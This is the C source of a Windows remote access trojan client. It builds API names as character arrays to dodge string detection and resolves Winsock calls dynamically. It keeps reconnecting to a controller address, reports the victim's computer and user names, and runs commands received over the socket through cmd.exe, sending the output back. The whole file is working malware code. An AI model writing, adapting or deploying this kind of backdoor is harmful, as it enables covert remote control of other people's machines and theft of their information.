#include <winsock2.h>
#include <Windows.h>
#include <stdio.h>
#include <string.h>

// Ws2_32.dll definitions
typedef SOCKET WSAAPI _socket(int af, int type, int protocol);
typedef int WSAAPI _connect(SOCKET s, const sockaddr *name, int namelen);
typedef int WSAAPI _send(SOCKET s, const char *buf, int len, int flags);
typedef int WSAAPI _closesocket(SOCKET s);
typedef u_short _htons(u_short hostshort);
typedef unsigned long WSAAPI _inet_addr(const char *cp);
typedef int WSAAPI _WSAStartup(WORD wVersionRequested, LPWSADATA lpWSAData);
typedef int _WSACleanup();
typedef int WSAAPI _WSAGetLastError();
typedef int WSAAPI _recv(SOCKET s, char *buf, int len, int flags);
typedef BOOL _GetUserNameA(LPSTR lpBuffer, LPDWORD pcbBuffer);
typedef BOOL _GetComputerNameA(LPSTR lpBuffer, LPDWORD nSize);

#define SOCKET_BUFFER_SIZE 256
#define SPLIT_STRING_ARRAY_SIZE 16
#define UNLEN 256

struct RATSocket
{
	HMODULE libraryWinsock2;
	SOCKET socketConnection;
	_WSAGetLastError *f_WSAGetLastError;	
};

int SocketSend(RATSocket* ratSocket, char* messageBuffer, unsigned int bufferSize)
{
	char ca_send[] = { 's','e','n','d', 0};
	_send* f_send = (_send*)GetProcAddress(ratSocket->libraryWinsock2, ca_send);
	if ( f_send(ratSocket->socketConnection, messageBuffer, bufferSize, 0) == SOCKET_ERROR )
	{
		char buffer[SOCKET_BUFFER_SIZE];
		sprintf_s(buffer, "Socket failed with error: %ld\n", ratSocket->f_WSAGetLastError());
		OutputDebugStringA(buffer);
		return 1;
	}
	return 0;
}

int SplitString(char* str, char* dest[SPLIT_STRING_ARRAY_SIZE], char* seps)
{
	int index = 0;
	
	char *token = NULL;
	char *nextToken = NULL;
	
	token = strtok_s(str, seps, &nextToken);
	while( token != NULL )
	{
		OutputDebugStringA(token);
		OutputDebugStringA("\n");

		dest[index++] = token;
		
		token = strtok_s(NULL, seps, &nextToken);
	}
	return index;
}

int CALLBACK
WinMain(HINSTANCE hInstance,
		HINSTANCE hPrevInstance,
		LPSTR lpCmdLine,
		int nCmdShow)
{
	RATSocket ratSocket = {};
	
	char ca_ws2_32[] = {'W','s','2','_','3','2','.','d','l','l', 0};
	ratSocket.libraryWinsock2 = LoadLibraryA(ca_ws2_32);
	if ( !ratSocket.libraryWinsock2 )
	{
		OutputDebugStringA("Loading ratSocket.libraryWinsock2 failed.\n");
		return 1;
	}

	char ca_WSAGetLastError[] = { 'W','S','A','G','e','t','L','a','s','t','E','r','r','o','r', 0 };
	char ca_WSAStartup[] = { 'W','S','A','S','t','a','r','t','u','p',0 };
	ratSocket.f_WSAGetLastError = (_WSAGetLastError*)GetProcAddress(ratSocket.libraryWinsock2, ca_WSAGetLastError);
	
	for(;;)
	{
		WSADATA wsaData;

		_WSAStartup* f_WSAStartup = (_WSAStartup*)GetProcAddress(ratSocket.libraryWinsock2, ca_WSAStartup);
		if ( f_WSAStartup(MAKEWORD(2,2), &wsaData) != NO_ERROR )
		{
			OutputDebugStringA("WSAStartup failed.\n");
			return 1;
		}

		char ca_socket[] = { 's','o','c','k','e','t',0 };
		_socket* f_socket = (_socket*)GetProcAddress(ratSocket.libraryWinsock2, ca_socket);

		ratSocket.socketConnection = f_socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if ( ratSocket.socketConnection == INVALID_SOCKET )
		{	
			char buffer[256];
			sprintf_s(buffer, "Socket failed with error: %ld\n", ratSocket.f_WSAGetLastError());
			OutputDebugStringA(buffer);

			char ca_WSACleanup[] = { 'W','S','A','C','l','e','a','n','u','p',0 };
			_WSACleanup* f_WSACleanup = (_WSACleanup*)GetProcAddress(ratSocket.libraryWinsock2, ca_WSACleanup);
			f_WSACleanup();
			return 1;
		}

		char ca_htons[] = { 'h','t','o','n','s',0 };
		char ca_inet_addr[] = { 'i','n','e','t','_','a','d','d','r',0 };
	
		_htons* f_htons = (_htons*)GetProcAddress(ratSocket.libraryWinsock2, ca_htons);
		_inet_addr* f_inet_addr = (_inet_addr*)GetProcAddress(ratSocket.libraryWinsock2, ca_inet_addr);

		char ca_ip_addr[] = { '1','2','7','.','0','.','0','.','1', 0 };
	
		struct sockaddr_in socketAddress;
		socketAddress.sin_family = AF_INET;
		socketAddress.sin_port = f_htons(65432);
		socketAddress.sin_addr.s_addr = f_inet_addr(ca_ip_addr);

		char ca_connect[] = { 'c','o','n','n','e','c','t', 0};
		_connect* f_connect = (_connect*)GetProcAddress(ratSocket.libraryWinsock2, ca_connect);

		if ( f_connect(ratSocket.socketConnection, (SOCKADDR*) &socketAddress, sizeof(socketAddress)) != SOCKET_ERROR )
		{
			OutputDebugStringA("Connection successful!\n");
			break;
		}
		else
		{
			char buffer[256];
			sprintf_s(buffer, "Socket failed with error: %ld\nReconnecting...\n", ratSocket.f_WSAGetLastError());
			OutputDebugStringA(buffer);

			// Try to reconnect
			// 
			char ca_closesocket[] = { 'c','l','o','s','e','s','o','c','k','e','t',0 };
			_closesocket* f_closesocket = (_closesocket*)GetProcAddress(ratSocket.libraryWinsock2, ca_closesocket);
			f_closesocket(ratSocket.socketConnection);

			char ca_WSACleanup[] = { 'W','S','A','C','l','e','a','n','u','p',0 };
			_WSACleanup* f_WSACleanup = (_WSACleanup*)GetProcAddress(ratSocket.libraryWinsock2, ca_WSACleanup);
			f_WSACleanup();
			
			Sleep(10000);
		}
	}

	SocketSend(&ratSocket, "login", 5);

	char ca_recv[] = { 'r','e','c','v', 0 };
	_recv* f_recv = (_recv*)GetProcAddress(ratSocket.libraryWinsock2, ca_recv);

	for(;;)
	{
		char recvBuffer[SOCKET_BUFFER_SIZE] = {};
		if ( f_recv(ratSocket.socketConnection, recvBuffer, SOCKET_BUFFER_SIZE, 0) == SOCKET_ERROR )
		{
			OutputDebugStringA("Error receiving message.");
		}
		
		OutputDebugStringA("Received command: ");
		char ca_info[] = { 'i','n','f','o',0 };
		char ca_cmd[] = { 'c','m','d',0 };
		char ca_shutdown[] = { 's','h','u','t','d','o','w','n',0 };

		char* splittedCommand[SPLIT_STRING_ARRAY_SIZE] = {};
		SplitString(recvBuffer, splittedCommand, " ");
		
		if ( strcmp(splittedCommand[0], ca_info) == 0 )
		{
			char bufferError[SOCKET_BUFFER_SIZE];
			char bufferUser[UNLEN + 1];
			DWORD len = sizeof(bufferUser);

			char ca_unknown[] = { 'u','n','k','n','o','w','n', 0 };
			char bufferComputer[MAX_COMPUTERNAME_LENGTH + 1];
			len = sizeof(bufferComputer);

			char ca_kernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l',0 };
			HMODULE libraryKernel32 = LoadLibraryA(ca_kernel32);
			if ( !libraryKernel32 )
			{
				OutputDebugStringA("Loading libraryKernel32 failed.\n");
				return 1;
			}
			
			char ca_GetComputerNameA[] = { 'G','e','t','C','o','m','p','u','t','e','r','N','a','m','e','A',0 };
			_GetComputerNameA* f_GetComputerNameA = (_GetComputerNameA*)GetProcAddress(libraryKernel32, ca_GetComputerNameA);
			
			if ( f_GetComputerNameA(bufferComputer, &len) <= 0 )
			{
				sprintf_s(bufferError, "Could not get computer name: %ld\n", GetLastError());
				OutputDebugStringA(bufferError);

				strncpy_s(bufferComputer, ca_unknown, sizeof(ca_unknown));
			}

			char ca_advapi32[] = { 'A','d','v','a','p','i','3','2','.','d','l','l',0 };
			HMODULE libraryAdvapi32 = LoadLibraryA(ca_advapi32);
			if ( !libraryAdvapi32 )
			{
				OutputDebugStringA("Loading libraryAdvapi32 failed.\n");
				return 1;
			}
			
			char ca_GetUserNameA[] = { 'G','e','t','U','s','e','r','N','a','m','e','A',0 };
			_GetUserNameA* f_GetUserNameA = (_GetUserNameA*)GetProcAddress(libraryAdvapi32, ca_GetUserNameA);

			if ( f_GetUserNameA(bufferUser, &len) <= 0 )
			{
				sprintf_s(bufferError, "Could not get username: %ld\n", GetLastError());
				OutputDebugStringA(bufferError);

				strncpy_s(bufferUser, ca_unknown, sizeof(ca_unknown));
			}

			char bufferInfo[SOCKET_BUFFER_SIZE];
			sprintf_s(bufferInfo, "%s:%s", bufferComputer, bufferUser);
			SocketSend(&ratSocket, bufferInfo, (unsigned int)strlen(bufferInfo));
		}
		else if ( strcmp(splittedCommand[0], ca_cmd) == 0 )
		{
			PROCESS_INFORMATION pi;
			STARTUPINFO si = { };
			si.cb = sizeof(si);

			char cmdPath[MAX_PATH+8];
			GetSystemDirectoryA(cmdPath, MAX_PATH);

			char ca_cmdexe[] = { '\\','c','m','d','.','e','x','e',0 };
			strncat_s(cmdPath, ca_cmdexe, 8);

			char tempPath[MAX_PATH];
			GetTempPathA(MAX_PATH, tempPath);

			char cmdArg[MAX_PATH + 8 + 3 + sizeof(tempPath)] = { '/','C',' ',0 };

			int commandIndex = 1;
			while ( splittedCommand[commandIndex] != NULL )
			{
				strncat_s(cmdArg, splittedCommand[commandIndex], sizeof(splittedCommand[commandIndex]));
				strncat_s(cmdArg, " ", 1);
				commandIndex++;
			}

			strncat_s(cmdArg, " > ", 3);
			strncat_s(cmdArg, tempPath, sizeof(tempPath));
			strncat_s(cmdArg, "test.txt", 8);
	
			if ( !CreateProcess(cmdPath, cmdArg, NULL, NULL, FALSE, 0 , NULL, NULL, &si, &pi) )
			{
				char bufferError[256];
				sprintf_s(bufferError, "CreateProcess failed (%d).\n", GetLastError());
				OutputDebugStringA(bufferError);
			}

			WaitForSingleObject( pi.hProcess, INFINITE );

			CloseHandle(pi.hProcess);
			CloseHandle(pi.hThread);

			char filePath[MAX_PATH];
			strncpy_s(filePath, MAX_PATH, tempPath, strlen(tempPath));
			strncat_s(filePath, "test.txt", 8);

			FILE* fs;
			errno_t errorNo = fopen_s(&fs, filePath, "rb");
			if ( errorNo == 0 )
			{
				while( !feof(fs) )
				{
					char readBuffer[SOCKET_BUFFER_SIZE] = {};
					size_t readSize = fread(&readBuffer, 1, SOCKET_BUFFER_SIZE, fs);
					if ( readSize > 0 )
					{
						SocketSend(&ratSocket, readBuffer, SOCKET_BUFFER_SIZE);
						OutputDebugStringA(readBuffer);
						OutputDebugStringA("\n");
					}
				}
				SocketSend(&ratSocket, "DONE", 4);
				OutputDebugString("DONE");
			}
			else
			{
				OutputDebugString("[ERROR] Error opening file.\n");
			}
			fclose(fs);
	
			return 0;
		}
		else if ( strcmp(splittedCommand[0], ca_shutdown) == 0 )
		{
			OutputDebugStringA("Received shutdown command.\n");
			break;
		}
		else
		{
			OutputDebugStringA("[WARNING] Unrecognized command: ");
			OutputDebugStringA(recvBuffer);
			OutputDebugStringA("\n");
			
			break;
		}
		OutputDebugStringA("\n");
		Sleep(3000);
	}

	OutputDebugStringA("Shutting down...");	
	
	char ca_closesocket[] = { 'c','l','o','s','e','s','o','c','k','e','t',0 };
	_closesocket* f_closesocket = (_closesocket*)GetProcAddress(ratSocket.libraryWinsock2, ca_closesocket);
	f_closesocket(ratSocket.socketConnection);

	char ca_WSACleanup[] = { 'W','S','A','C','l','e','a','n','u','p',0 };
	_WSACleanup* f_WSACleanup = (_WSACleanup*)GetProcAddress(ratSocket.libraryWinsock2, ca_WSACleanup);
	f_WSACleanup();
	
	return 0;
}
